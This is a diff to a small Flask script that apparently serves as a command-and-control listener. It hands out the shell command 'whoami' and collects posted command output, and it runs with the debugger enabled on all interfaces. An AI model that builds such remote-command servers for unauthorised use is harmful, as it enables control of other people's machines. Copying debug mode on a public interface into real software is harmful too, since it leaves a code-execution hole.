@@ -3,7 +3,7 @@
 
 # pip install flask
 # python3 -m pip install flask
-from flask import Flask, Request
+from flask import Flask, request
 # import flask
 # WARNING: The script flask.exe is installed in 'C:\Users\Guac\AppData\Roaming\Python\Python312\Scripts' which is not on PATH.
 # Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
@@ -14,14 +14,15 @@ app = Flask(__name__)
 def get_command():
     return "whoami"
 
-@app.route("/output")
+@app.route("/output",methods=["POST"])
 def get_output():
+    print(request.data.decode())
     #data = request.form["data"]
     #print(request)
-    print("a")
+    return "ok dont care"
 
 def main():
     # Start flask on all ports
-    app.run(host="0.0.0.0")
+    app.run(host="0.0.0.0",port=12345,debug=True)
 
 main()
